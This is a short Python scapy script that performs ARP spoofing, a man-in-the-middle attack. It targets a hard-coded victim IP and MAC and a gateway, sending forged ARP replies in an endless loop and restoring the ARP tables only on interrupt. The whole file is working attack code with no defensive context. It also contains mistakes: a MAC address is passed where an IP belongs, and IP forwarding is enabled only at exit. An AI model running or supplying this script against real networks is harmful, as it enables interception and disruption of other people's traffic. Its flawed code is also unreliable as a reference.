from scapy.all import *

import os

victim_ip = "141.11.84.149"
gateway_ip = "141.11.84.129"
victim_mac = "00:05:9a:3c:7a:00"
gateway_mac = "94:33:d8:21:69:24"


def spoof(target_ip, target_mac, spoof_ip):
	packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	send(packet, verbose=False)


def restore(target_ip, target_mac, source_ip, source_mac):
	packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
	send(packet, count=4, verbose=False)



try:
	print("Srarting ARP Spoofing...")
	while True:
		spoof(victim_ip, victim_mac, gateway_mac)
		spoof(gateway_ip, gateway_mac, victim_ip)
		time.sleep(2)

except KeyboardInterrupt:
	print("Restoring network....")
	restore(victim_ip,victim_mac, gateway_ip, gateway_mac)
	restore(gateway_ip, gateway_mac, victim_ip, victim_mac)
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")